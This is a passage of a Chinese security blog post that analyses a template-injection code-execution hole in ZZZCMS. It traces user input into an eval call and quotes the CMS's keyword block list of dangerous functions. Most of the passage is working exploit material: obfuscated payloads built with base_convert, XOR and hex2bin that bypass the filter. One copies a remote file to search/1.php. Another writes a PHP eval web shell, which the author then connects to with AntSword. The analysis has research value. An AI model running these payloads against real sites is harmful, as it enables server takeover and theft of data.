&#39;istop&#39; &#x3D;&gt; &#39;desc&#39;, &#39;isgood&#39; &#x3D;&gt; &#39;desc&#39;, &#39;c_order&#39; &#x3D;&gt; &#39;asc&#39;, &#39;c_addtime&#39; &#x3D;&gt; &#39;desc&#39;, &#39;cid&#39; &#x3D;&gt; &#39;desc&#39; );</span><br><span class="line">            $sid &#x3D; G( &#39;sid&#39; );</span><br><span class="line">            $arr &#x3D; parse_url( $_SERVER[ &#39;REQUEST_URI&#39; ] );              </span><br><span class="line">            $size &#x3D; 10;</span><br><span class="line">            …</span><br><span class="line">            …</span><br><span class="line">            …</span><br><span class="line">            $norecord &#x3D;isset( $norecord ) ? $norecord : &#39;很抱歉，没有找到匹配内容！&#39; ;</span><br><span class="line">            $keys &#x3D; danger_key(getform( &#39;keys&#39;, &#39;cookie&#39; )); </span><br><span class="line">            if ( $sid ) arr_add( $where, &#39;c_sid&#39;, db_subsort( $sid ) );             </span><br><span class="line">            …</span><br><span class="line">            …</span><br><span class="line">            …</span><br><span class="line">            $zcontent &#x3D; $this-&gt;parserListPage( $zcontent );</span><br><span class="line">return $zcontent;</span><br></pre></td></tr></table></figure>
<p>5.然后到1829行$keys = danger_key(getform( ‘keys’, ‘cookie’ ))，其中调用了getform函数，getform函数会从REQUEST中获取keys的值，然后使用txt_html对$data进行编码，最后返回编码后的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">function getform( $name, $source &#x3D; &#39;both&#39;, $type &#x3D; NULL, $default &#x3D; NULL  ) &#123;</span><br><span class="line">      switch ( $source ) &#123;</span><br><span class="line">            case &#39;post&#39;:</span><br><span class="line">                  $data &#x3D; _POST( $name );</span><br><span class="line">                  break;</span><br><span class="line">            case &#39;get&#39;:</span><br><span class="line">                  $data &#x3D; _GET( $name );</span><br><span class="line">                  break;</span><br><span class="line">            case &#39;cookie&#39;:</span><br><span class="line">                  $data &#x3D; _REQUEST($name);&#x2F;&#x2F;_REQUESTS(&#39;keys&#39;)</span><br><span class="line">            if($data) &#123;</span><br><span class="line">                 set_cookie( $name,$data ) ;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $data&#x3D;get_cookie( $name,$data ) ;</span><br><span class="line">            &#125;</span><br><span class="line">                  break;</span><br><span class="line">            case &#39;both&#39;:</span><br><span class="line">                  $data &#x3D; _POST( $name ) ? : _GET( $name );</span><br><span class="line">                  break;</span><br><span class="line">      &#125;</span><br><span class="line">    if($name&#x3D;&#x3D;&#39;act&#39;)&#123;</span><br><span class="line">        if(_REQUEST(&#39;act&#39;)!&#x3D;&#39;&#39;)&#123;</span><br><span class="line">            $referer&#x3D;_SERVER(&#39;HTTP_REFERER&#39;);</span><br><span class="line">            if(!defined(&#39;WAPPATH&#39;)) &#123;         </span><br><span class="line">                if ( strpos( $referer, conf(&#39;wappath&#39; )) !&#x3D;&#x3D; FALSE ) &#123;  </span><br><span class="line">                    define( &#39;WAPPATH&#39;, conf(&#39;wappath&#39; ));        </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      if ( !is_null( $type ) ) &#123;</span><br><span class="line">        if(ifch($default))&#123;</span><br><span class="line">            $err &#x3D; checkstr( $data, $type, $default );</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $err &#x3D; checkstr( $data, $type, $name );</span><br><span class="line">        &#125;</span><br><span class="line">            if ( $err[ &#39;code&#39; ] &#x3D;&#x3D; 0 )&#123;</span><br><span class="line">                  if ( $default &#x3D;&#x3D; &#39;layer&#39; ) &#123;</span><br><span class="line">                        layererr( $err[ &#39;err&#39; ] );</span><br><span class="line">                  &#125;else if( $default &#x3D;&#x3D; &#39;json&#39; )&#123;</span><br><span class="line">                        returnmsg(&#39;json&#39;,0,$err[ &#39;err&#39; ]);</span><br><span class="line">                  &#125;else&#123;</span><br><span class="line">                        back($err[ &#39;err&#39; ]);</span><br><span class="line">                  &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;</span><br><span class="line">      if ( !is_null( $default ) &amp;&amp; !ifch( $default) ) &#123;</span><br><span class="line">            $data &#x3D; empty( $data ) ? $default : $data;</span><br><span class="line">      &#125;</span><br><span class="line">      return txt_html( $data );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>6.然后继续回到第三点中的parserCommom方法，在调用parserlocation后会调用parserIfLabel方法，跟进parserIfLabel方法，$zcontent是parserlocation的返回值。danger_key()方法用于过滤危险字符，返回过滤后的值并赋值给$ifstr，接着将$ifstr传递给eval函数，执行完成后返回过滤后的$zcontent，最后渲染$zcontent的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public</span><br><span class="line">function parserIfLabel( $zcontent ) &#123;&#x2F;&#x2F;漏洞</span><br><span class="line">      $pattern &#x3D; &#39;&#x2F;\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;&#x2F;&#39;;&#x2F;&#x2F;可控导致漏洞</span><br><span class="line">      if ( preg_match_all( $pattern, $zcontent, $matches ) ) &#123;</span><br><span class="line">            $count &#x3D; count( $matches[ 0 ] );</span><br><span class="line">            for ( $i &#x3D; 0; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">                  $flag &#x3D; &#39;&#39;;</span><br><span class="line">                  $out_html &#x3D; &#39;&#39;;</span><br><span class="line">                  $ifstr &#x3D; $matches[ 1 ][ $i ];</span><br><span class="line">                  $ifstr&#x3D;danger_key($ifstr,1);&#x2F;&#x2F;检测恶意字符</span><br><span class="line">               if(strpos($ifstr,&#39;&#x3D;&#39;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">                  $arr&#x3D; splits($ifstr,&#39;&#x3D;&#39;);</span><br><span class="line">                   if($arr[0]&#x3D;&#x3D;&#39;&#39; || $arr[1]&#x3D;&#x3D;&#39;&#39;)&#123;</span><br><span class="line">                        error(&#39;很抱歉，模板中有错误的判断,请修正【&#39;.$ifstr.&#39;】&#39;);</span><br><span class="line">                   &#125;</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;&#x3D;&#39;, &#39;&#x3D;&#x3D;&#39;, $ifstr );     </span><br><span class="line">               &#125;</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;&lt;&gt;&#39;, &#39;!&#x3D;&#39;, $ifstr );</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;or&#39;, &#39;||&#39;, $ifstr );</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;and&#39;, &#39;&amp;&amp;&#39;, $ifstr );</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;mod&#39;, &#39;%&#39;, $ifstr );</span><br><span class="line">                  $ifstr &#x3D; str_replace( &#39;not&#39;, &#39;!&#39;, $ifstr );</span><br><span class="line">               if ( preg_match( &#39;&#x2F;\&#123;|&#125;&#x2F;&#39;, $ifstr)) &#123;    </span><br><span class="line">                 error(&#39;很抱歉，模板中有错误的判断,请修正&#39;.$ifstr);</span><br><span class="line">               &#125;else&#123;</span><br><span class="line">                 @eval( &#39;if(&#39; . $ifstr . &#39;)&#123;$flag&#x3D;&quot;if&quot;;&#125;else&#123;$flag&#x3D;&quot;else&quot;;&#125;&#39;  );&#x2F;&#x2F;漏洞点</span><br><span class="line">               &#125;      </span><br><span class="line">          ……        </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      return $zcontent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>7.整个调用过程如下图所示：</p>
<p><img src="/.io//Users\eva\AppData\Roaming\Typora\typora-user-images\image-20201019101039399.png" alt="image-20201019101039399"></p>
<h2 id="过滤函数分析"><a href="#过滤函数分析" class="headerlink" title="过滤函数分析"></a>过滤函数分析</h2><p>danger_key会过滤很多常用函数，有关命令执行以及写文件的函数都已被过滤，部分编码函数decode，chr等也不能利用，但是类似array_map，array_filter，uasort等回调函数并没有进行过滤。</p>
<p>同时会过滤常见的字符，比如这里会将单引号、双引号等特殊字符html编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function danger_key($s,$type&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    $s&#x3D;empty($type) ? htmlspecialchars($s) : $s;</span><br><span class="line">    $key&#x3D;array(&#39;php&#39;,&#39;preg&#39;,&#39;decode&#39;,&#39;post&#39;,&#39;get&#39;,&#39;cookie&#39;,&#39;session&#39;,&#39;$&#39;,&#39;exec&#39;,&#39;ascii&#39;,&#39;ord&#39;,&#39;eval&#39;,&#39;replace&#39;);</span><br><span class="line">    $s &#x3D; str_ireplace($key,&quot;*&quot;,$s); </span><br><span class="line">    $danger&#x3D;array(&#39;php&#39;,&#39;preg&#39;,&#39;server&#39;,&#39;chr&#39;,&#39;decode&#39;,&#39;html&#39;,&#39;md5&#39;,&#39;post&#39;,&#39;get&#39;,&#39;request&#39;,&#39;file&#39;,&#39;cookie&#39;,&#39;session&#39;,&#39;sql&#39;,&#39;mkdir&#39;,&#39;copy&#39;,&#39;fwrite&#39;,&#39;del&#39;,&#39;encrypt&#39;,&#39;$&#39;,&#39;system&#39;,&#39;exec&#39;,&#39;shell&#39;,&#39;open&#39;,&#39;ini_&#39;,&#39;chroot&#39;,&#39;eval&#39;,&#39;passthru&#39;,&#39;include&#39;,&#39;require&#39;,&#39;assert&#39;,&#39;union&#39;,&#39;create&#39;,&#39;func&#39;,&#39;symlink&#39;,&#39;sleep&#39;,&#39;ord&#39;,&#39;print&#39;,&#39;echo&#39;);</span><br><span class="line">   foreach ($danger as $val)&#123;</span><br><span class="line">       if(strpos($s,$val) !&#x3D;&#x3D;false)&#123;</span><br><span class="line">        error(&#39;很抱歉，执行出错，发现危险字符【&#39;.$val.&#39;】&#39;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><p>array_map主要作用是为数组的每个元素应用回调函数。</p>
<blockquote>
<p>用法：array_map ( callable $callback , array $array1 [, array $… ] ) : array</p>
</blockquote>
<p>array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 array_map() 返回一个 array，数组内容为 array1 的元素按索引顺序为参数调用 callback 后的结果（有更多数组时，还会传入 … 的元素）。 callback 函数形参的数量必须匹配 array_map() 实参中数组的数量。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map(copy,array(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;1&#39;),array(&#39;.&#x2F;1.php&#39;));</span><br></pre></td></tr></table></figure>
<p>copy作为回调函数作用是拷贝文件，将第一个参数（源文件路径）拷贝到第二个参数（目标路径），通过array_map函数对其传参。这样我们便可拷贝远程服务器的文件到目标路径实现文件上传。</p>
<p>由于上述过滤规则会导致/‘等字符无法使用，故此处考虑使用base_convert函数</p>
<blockquote>
<p>base_convert ( string $number , int $frombase , int $tobase ) : string</p>
</blockquote>
<p>为了能表示上述payload 的英文字符，这里需要考虑使用36进制，特殊符号可以通过异或的方式得到,具体实现如下：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>表达式</th>
</tr>
</thead>
<tbody><tr>
<td>[</td>
<td>base_convert(1, 10, 36) ^ base_convert(13, 16, 36)</td>
</tr>
<tr>
<td>]</td>
<td>base_convert(1, 10, 36) ^ base_convert(15, 16, 36)</td>
</tr>
<tr>
<td>\</td>
<td>base_convert(1, 10, 36) ^ base_convert(16, 16, 36)</td>
</tr>
<tr>
<td>^</td>
<td>base_convert(1, 10, 36) ^ base_convert(18, 16, 36)</td>
</tr>
<tr>
<td>_</td>
<td>base_convert(1, 10, 36) ^ base_convert(17, 16, 36)</td>
</tr>
<tr>
<td>`</td>
<td>base_convert(16, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(6, 10, 36)</td>
</tr>
<tr>
<td>+</td>
<td>base_convert(12, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(34, 10, 36)</td>
</tr>
<tr>
<td>(</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(12, 10, 36)</td>
</tr>
<tr>
<td>)</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(11, 10, 36)</td>
</tr>
<tr>
<td>/</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(13, 10, 36)</td>
</tr>
<tr>
<td>.</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(14, 10, 36)</td>
</tr>
<tr>
<td>&lt;</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(32, 10, 36)</td>
</tr>
<tr>
<td>&gt;</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(30, 10, 36)</td>
</tr>
<tr>
<td>=</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(31, 10, 36)</td>
</tr>
<tr>
<td>?</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(29, 10, 36)</td>
</tr>
<tr>
<td>:</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(26, 10, 36)</td>
</tr>
<tr>
<td>;</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(25, 10, 36)</td>
</tr>
<tr>
<td>$</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(24, 10, 36)</td>
</tr>
<tr>
<td>%</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(23, 10, 36)</td>
</tr>
<tr>
<td>&amp;</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(22, 10, 36)</td>
</tr>
<tr>
<td>‘</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(21, 10, 36)</td>
</tr>
<tr>
<td></td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(20, 10, 36)</td>
</tr>
<tr>
<td>!</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(19, 10, 36)</td>
</tr>
<tr>
<td>“</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(18, 10, 36)</td>
</tr>
<tr>
<td>#</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(17, 10, 36)</td>
</tr>
<tr>
<td>,</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(16, 10, 36)</td>
</tr>
<tr>
<td>*</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(10, 10, 36)</td>
</tr>
<tr>
<td>|</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(7, 10, 36)</td>
</tr>
<tr>
<td>{</td>
<td>base_convert(2, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(33, 10, 36)</td>
</tr>
<tr>
<td>}</td>
<td>base_convert(14, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(35, 10, 36)</td>
</tr>
<tr>
<td>~</td>
<td>base_convert(35, 10, 36) ^ base_convert(1, 10, 36) ^ base_convert(5, 10, 36)</td>
</tr>
<tr>
<td>@</td>
<td>base_convert(1, 10, 36) ^ base_convert(26, 10, 36)</td>
</tr>
</tbody></table>
<p>完整的payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:array_map(base_convert(591910,10,36), array(base_convert(831805,10,36). (base_convert(14,10,36)^base_convert(1,10,36)^base_convert(23,10,36)). (base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)). (base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).(127). (base_convert(26,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).(0). (base_convert(26,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).(0). (base_convert(26,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).(1). (base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)). (base_convert(1,10,36))),array((base_convert(1,10,36)). (base_convert(26,10,36)^base_convert(1,10,36)^base_convert(23,10,36)). (base_convert(33037,10,36))))&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
<p>发送上述payload会在search目录下生成1.php文件。</p>
<p><img src="/.io//Users\eva\AppData\Roaming\Typora\typora-user-images\image-20201019102614797.png![image-20201019104046447](C:\Users\eva\AppData\Roaming\Typora\typora-user-images\image-20201019104046447.png"></p>
<p>访问/zzzcms/search/1.php，蚁剑连接getshell。</p>
<p><img src="/.io//Users\eva\AppData\Roaming\Typora\typora-user-images\image-20201019105200703.png" alt="image-20201019105200703"></p>
<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map(file_put_contents,array(&#39;.&#x2F;1.php&#39;),array(&#39;&lt;?PHP eval($_POST[1]);&#39;));</span><br></pre></td></tr></table></figure>
<p>需要利用四个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line">bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</span><br></pre></td></tr></table></figure>
<p>通过base_convert异或构造特殊字符过于繁琐，这里还可以利用hex2bin()和dechex()函数。<br>首先将字符串通过bin2hex()函数编码成十六进制，由于payload中不能存在引号，编码后的结果需要再一次通过hexdec()函数转码成十进制，最后利用hex2bin(dechex(需要解码的字符)还原字符串。构造出payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:array_map((hex2bin(dechex(6711660)).hex2bin(dechex(6643568)).hex2bin(dechex(1970560867)).hex2bin(dechex(1869509733)).hex2bin(dechex(7238771)))  ,array(hex2bin(dechex(774844718)).hex2bin(dechex(7366768))),array(hex2bin(dechex(1010770032)).hex2bin(dechex(1752178789)).hex2bin(dechex(1986096168)).hex2bin(dechex(610226255)).hex2bin(dechex(1398037297)).hex2bin(dechex(6105403))))&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
<p>之所以这么拼接是因为本地测试的时候编码解码会出现截断的情况每次好像只能允许是四个字符，但是后来又看了一下hex2bin这个函数，官网说如果输入的十六进制字符串是奇数长数或者无效的十六进制字符串将会抛出 E_WARNING 级别的错误。理论上只要是控制偶数长度就能正常解码，也是后来才知道的也就懒得去看了反正这个payload也还能用哈哈哈。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





  



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">热爱篮球和安全的小伙子</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  

</body>
</html>
